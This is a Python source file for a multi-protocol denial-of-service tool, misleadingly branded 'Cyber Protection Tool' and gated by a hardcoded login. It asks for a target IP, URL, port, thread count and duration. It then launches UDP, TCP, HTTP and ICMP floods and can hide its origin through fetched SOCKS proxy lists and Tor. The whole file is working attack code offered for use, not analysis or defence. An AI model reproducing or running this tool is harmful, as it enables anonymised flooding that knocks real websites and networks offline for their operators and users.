import os
import time
import socket
import random
import threading
import requests
import socks
import logging
import base64
import subprocess
from scapy.all import IP, TCP, UDP, ICMP, send
from colorama import init, Fore
from fake_useragent import UserAgent
from queue import Queue
from threading import Lock
import concurrent.futures
import asyncio
import aiohttp

# Initialize colorama, logging, and thread lock
init()
logging.basicConfig(filename="ddos_log_v5.txt", level=logging.INFO, format="%(asctime)s - %(message)s")
print_lock = Lock()
PROXY_LIST_URL = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"
TOR_PORT = 9050

def print_logo():
    os.system("clear")
    print(Fore.GREEN)
    print("   ╔══════════════════════════════════════════════════════════════╗")
    print("   ║         CYBER PROTECTION TOOL v5.0 - ULTIMATE POWER         ║")
    print("   ╚══════════════════════════════════════════════════════════════╝")
    print("\n")
    print("   _____      _                 _____           _            _   _              ")
    print("  / ____|    | |               |  __ \\         | |          | | (_)             ")
    print(" | |    _   _| |__   ___ _ __  | |__) | __ ___ | |_ ___  ___| |_ _  ___  _ __   ")
    print(" | |   | | | | '_ \\ / _ \\ '__| |  ___/ '__/ _ \\| __/ _ \\/ __| __| |/ _ \\| '_ \\  ")
    print(" | |___| |_| | |_) |  __/ |    | |   | | | (_) | ||  __/ (__| |_| | (_) | | | | ")
    print("  \\_____\\__, |_.__/ \\___|_|    |_|   |_|  \\___/ \\__\\___|\\___|\\__|_|\\___/|_| |_| ")
    print("         __/ |                                                                 ")
    print("        |___/                                                                 ")
    print(Fore.CYAN)
    print("   ╔══════════════════════════════════════════════════════════════════════╗")
    print("   ║                    DEVELOPER INFORMATION                             ║")
    print("   ╠══════════════════════════════════════════════════════════════════════╣")
    print("   ║  👤 Coded By  : MEHEDI.EXX                                           ║")
    print("   ║  🖊️ Author     : CYBER PROTECTION                                     ║")
    print("   ║  🔥 Tool Version: 5.0 (Ultimate Edition - Termux Optimized)          ║")
    print("   ╚══════════════════════════════════════════════════════════════════════╝")
    print("\n")

def login():
    print(Fore.GREEN)
    print("   ╔════════════════════════════╗")
    print("   ║      LOGIN TO CONTINUE     ║")
    print("   ╚════════════════════════════╝")
    attempts = 0
    while attempts < 3:
        username = input("\n   ➤ Enter Username: ")
        password = input("   ➤ Enter Password: ")
        if username == "MEHEDI" and password == "CPDDOS":
            print("\n   ✅ Login Successful!\n")
            time.sleep(1)
            os.system("clear")
            return True
        else:
            attempts += 1
            print(f"\n   ❌ Invalid Credentials! Attempts Left: {3 - attempts}\n")
    print("\n   ❌ Access Denied! Exiting...\n")
    exit()

def fetch_proxies():
    try:
        response = requests.get(PROXY_LIST_URL, timeout=5)
        proxies = response.text.splitlines()
        return [proxy for proxy in proxies if proxy.strip()]
    except Exception as e:
        print(Fore.RED + f"   ❌ Failed to fetch proxies: {e}")
        return []

def setup_tor():
    try:
        socks.set_default_proxy(socks.SOCKS5, "localhost", TOR_PORT)
        socket.socket = socks.socksocket
        print(Fore.GREEN + "   ✅ TOR network enabled!")
    except Exception as e:
        print(Fore.RED + f"   ❌ TOR setup failed: {e}")

def loading_bar():
    print(Fore.RED)
    for i in range(101):
        time.sleep(0.001)
        print(f"\r   ➤ Loading: [{'#' * (i//5)}{' ' * (20 - (i//5))}] {i}%", end='', flush=True)
    print("\n\n")

def get_target_details():
    print(Fore.YELLOW)
    print("   ╔══════════════════════════════════════════╗")
    print("   ║          ENTER TARGET DETAILS            ║")
    print("   ╚══════════════════════════════════════════╝")
    url = input("\n   ➤ Enter Target Website URL (for HTTP) or press Enter: ")
    ip = input("   ➤ Enter Target IP Address: ")
    port = int(input("   ➤ Enter Target Port Number: "))
    threads = int(input("   ➤ Enter Number of Threads (1 or more, unlimited): "))
    if threads < 1:
        threads = 1
    packet_size = int(input("   ➤ Enter Packet Size (bytes, 64-65500): "))
    attack_type = input("   ➤ Attack Type (udp/tcp/http/icmp/all): ").lower()
    duration = int(input("   ➤ Attack Duration (seconds, 0 for unlimited): "))
    print("\n   ✅ Details received successfully.\n")
    return url, ip, port, threads, packet_size, attack_type, duration

def udp_flood(ip, port, packet_size, thread_name, duration, stats_queue):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(packet_size)
    packet_count = 0
    start_time = time.time()
    while duration == 0 or time.time() - start_time < duration:
        try:
            sock.sendto(payload, (ip, port))
            packet_count += 1
            msg = f"Thread {thread_name} sent UDP packet #{packet_count} to {ip}:{port}"
            with print_lock:
                print(Fore.MAGENTA + f"   ➤ {msg}")
            logging.info(msg)
        except Exception as e:
            with print_lock:
                print(Fore.RED + f"   ❌ Error in {thread_name}: {e}")
            break
    stats_queue.put(packet_count)

def tcp_flood(ip, port, packet_size, thread_name, duration, stats_queue):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    payload = random._urandom(packet_size)
    packet_count = 0
    start_time = time.time()
    while duration == 0 or time.time() - start_time < duration:
        try:
            sock.connect((ip, port))
            sock.send(payload)
            packet_count += 1
            msg = f"Thread {thread_name} sent TCP packet #{packet_count} to {ip}:{port}"
            with print_lock:
                print(Fore.MAGENTA + f"   ➤ {msg}")
            logging.info(msg)
            sock.close()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except Exception as e:
            with print_lock:
                print(Fore.RED + f"   ❌ Error in {thread_name}: {e}")
            break
    stats_queue.put(packet_count)

async def http_flood_async(url, thread_name, duration, stats_queue):
    ua = UserAgent()
    packet_count = 0
    start_time = time.time()
    async with aiohttp.ClientSession() as session:
        while duration == 0 or time.time() - start_time < duration:
            try:
                headers = {"User-Agent": ua.random}
                async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as response:
                    packet_count += 1
                    msg = f"Thread {thread_name} sent HTTP request #{packet_count} to {url} - Status: {response.status}"
                    with print_lock:
                        print(Fore.MAGENTA + f"   ➤ {msg}")
                    logging.info(msg)
            except Exception as e:
                with print_lock:
                    print(Fore.RED + f"   ❌ Error in {thread_name}: {e}")
                break
    stats_queue.put(packet_count)

def icmp_flood(ip, thread_name, duration, stats_queue):
    packet_count = 0
    start_time = time.time()
    while duration == 0 or time.time() - start_time < duration:
        try:
            packet = IP(dst=ip)/ICMP()
            send(packet, verbose=0)
            packet_count += 1
            msg = f"Thread {thread_name} sent ICMP packet #{packet_count} to {ip}"
            with print_lock:
                print(Fore.MAGENTA + f"   ➤ {msg}")
            logging.info(msg)
        except Exception as e:
            with print_lock:
                print(Fore.RED + f"   ❌ Error in {thread_name}: {e}")
            break
    stats_queue.put(packet_count)

def rotate_proxies(proxies, proxy_queue):
    while True:
        random.shuffle(proxies)
        for proxy in proxies:
            proxy_queue.put(proxy)
            time.sleep(0.5)

async def run_http_flood(url, thread_name, duration, stats_queue):
    await http_flood_async(url, thread_name, duration, stats_queue)

def start_attack(url, ip, port, threads, packet_size, attack_type, duration, use_proxy=False, use_tor=False):
    print(Fore.CYAN)
    print("   ╔══════════════════════════════════════════╗")
    print("   ║         ULTIMATE DDOS ATTACK v5.0        ║")
    print("   ╚══════════════════════════════════════════╝")
    print(f"\n   🚀 Attack started on {ip}:{port} (Multi-Protocol) or {url} (HTTP) with {threads} threads (Unlimited Mode)")

    proxies = fetch_proxies() if use_proxy else []
    proxy_queue = Queue()
    stats_queue = Queue()
    if use_proxy and not proxies:
        print(Fore.RED + "   ❌ No proxies available. Falling back to direct attack.")
        use_proxy = False
    if use_tor:
        setup_tor()
    if use_proxy:
        threading.Thread(target=rotate_proxies, args=(proxies, proxy_queue), daemon=True).start()

    thread_list = []
    loop = asyncio.get_event_loop()

    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        for i in range(threads):
            thread_name = f"Thread-{i+1}"
            if attack_type in ["udp", "all"]:
                t_udp = threading.Thread(target=udp_flood, args=(ip, port, packet_size, thread_name, duration, stats_queue), name=thread_name)
                thread_list.append(t_udp)
            if attack_type in ["tcp", "all"]:
                t_tcp = threading.Thread(target=tcp_flood, args=(ip, port, packet_size, thread_name, duration, stats_queue), name=thread_name)
                thread_list.append(t_tcp)
            if attack_type in ["http", "all"] and url:
                executor.submit(lambda: loop.run_until_complete(run_http_flood(url, thread_name, duration, stats_queue)))
            if attack_type in ["icmp", "all"]:
                t_icmp = threading.Thread(target=icmp_flood, args=(ip, thread_name, duration, stats_queue), name=thread_name)
                thread_list.append(t_icmp)

        for t in thread_list:
            t.start()

    total_packets = 0
    while thread_list or not stats_queue.empty():
        try:
            total_packets += stats_queue.get(timeout=1)
        except:
            break
    print(Fore.GREEN + f"\n   ✅ Attack completed! Total packets sent: {total_packets}")

def main():
    print_logo()
    if login():
        loading_bar()
        url, ip, port, threads, packet_size, attack_type, duration = get_target_details()
        use_proxy = input("\n   ➤ Use proxies with auto-rotation? (y/n): ").lower() == 'y'
        use_tor = input("   ➤ Use TOR network? (y/n, requires tor installed): ").lower() == 'y'
        start_attack(url, ip, port, threads, packet_size, attack_type, duration, use_proxy, use_tor)
    else:
        print(Fore.RED + "   ❌ Access Denied! Please try logging in again.")

if __name__ == "__main__":
    main()
